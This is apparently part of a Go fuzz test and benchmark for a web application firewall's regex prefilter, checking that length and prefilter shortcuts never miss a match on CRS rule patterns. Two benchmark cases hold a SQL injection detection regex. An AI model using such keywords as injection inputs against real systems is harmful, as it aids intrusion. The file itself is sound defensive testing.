	type compiled struct {
		re *regexp.Regexp
		ml int
		pf func(string) bool
	}
	cc := make([]compiled, len(crsPatterns))
	for i, p := range crsPatterns {
		cc[i] = compiled{
			re: regexp.MustCompile(p),
			ml: minMatchLength(p),
			pf: prefilterFunc(p),
		}
	}

	f.Fuzz(func(t *testing.T, input string) {
		// Cap input length to prevent the fuzzer from generating strings that
		// cause expensive regex evaluations and stall the fuzzer. CRS patterns
		// can be costly on longer inputs (e.g. log4shell with backtracking).
		if len(input) > 128 {
			return
		}
		for i, c := range cc {
			regexMatches := c.re.MatchString(input)

			if regexMatches && len(input) < c.ml {
				t.Errorf("FALSE NEGATIVE via minLen: pattern=%q input=%q (len=%d, minLen=%d)",
					crsPatterns[i], input, len(input), c.ml)
			}

			if c.pf != nil && regexMatches && !c.pf(input) {
				t.Errorf("FALSE NEGATIVE via prefilter: pattern=%q input=%q",
					crsPatterns[i], input)
			}
		}
	})
}

func BenchmarkRxPrefilter(b *testing.B) {
	benchmarks := []struct {
		name    string
		pattern string
		input   string
	}{
		{
			name:    "crs_sqli_alternation",
			pattern: `(?:union\s+select|insert\s+into|delete\s+from)`,
			input:   "GET /index.html?page=home&user=admin&lang=en HTTP/1.1",
		},
		{
			name:    "crs_sqli_case_insensitive",
			pattern: `(?i)(?:union\s+select|insert\s+into|delete\s+from)`,
			input:   "GET /index.html?page=home&user=admin&lang=en HTTP/1.1",
		},
		{
			name:    "literal_concat",
			pattern: `hello.*world`,
			input:   "just a normal request without any attack payload at all",
		},
		{
			name:    "no_prefilter_charclass",
			pattern: `[a-z]+\d+`,
			input:   "just a normal request without any attack payload at all",
		},
	}

	for _, bm := range benchmarks {
		re := regexp.MustCompile(bm.pattern)
		pf := prefilterFunc(bm.pattern)
		ml := minMatchLength(bm.pattern)

		b.Run(bm.name+"/regex_only", func(b *testing.B) {
			for i := 0; i < b.N; i++ {
				re.MatchString(bm.input)
			}
		})

		b.Run(bm.name+"/prefilter+regex", func(b *testing.B) {
			for i := 0; i < b.N; i++ {
				if len(bm.input) < ml {
					continue
				}
				if pf != nil && !pf(bm.input) {
					continue
				}
				re.MatchString(bm.input)
			}
		})
	}
}
